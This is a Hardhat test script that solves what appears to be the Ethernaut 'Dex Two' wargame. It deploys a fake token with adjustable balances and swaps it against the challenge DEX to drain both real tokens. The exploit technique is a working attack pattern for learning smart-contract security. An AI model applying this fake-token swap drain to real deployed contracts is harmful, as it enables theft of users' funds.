import { expect } from "chai";
import { Address } from "cluster";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel, bigNumberToEther,
         logEvents, dumpStorage, waitTx } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let eoaAddress: string;
let fakeToken: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  eoaAddress = await eoa.getAddress();
  const challengeFactory = await ethers.getContractFactory(`DexTwo`);
  const challengeAddress = await createChallenge(
    `0xd2BA82c4777a8d619144d32a2314ee620BC9E09c`
  );

  challenge = await challengeFactory.attach(challengeAddress);

  const fakeTokenFactory = await ethers.getContractFactory(`DexTwoFakeToken`);
  fakeToken = await fakeTokenFactory.deploy("Fake Token", "FAKE");
  await waitTx(fakeToken.initialize(eoaAddress, challenge.address));
});

it("solves the challenge", async function () {
  const amount = Math.floor(Math.random() * 100);
  await waitTx(fakeToken.resetBalances(amount));

  let token1 = await challenge.token1();
  let token2 = await challenge.token2();

  await waitTx(challenge.approve(eoaAddress,1000));
  await waitTx(challenge.approve(challenge.address, 1000));

  await waitTx(fakeToken.approve(eoaAddress,1000));
  await waitTx(fakeToken.approve(challenge.address, 1000));

  await waitTx(challenge.swap(fakeToken.address, token2, amount));

  await waitTx(fakeToken.resetBalances(amount));

  await waitTx(challenge.swap(fakeToken.address, token1, amount));

});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
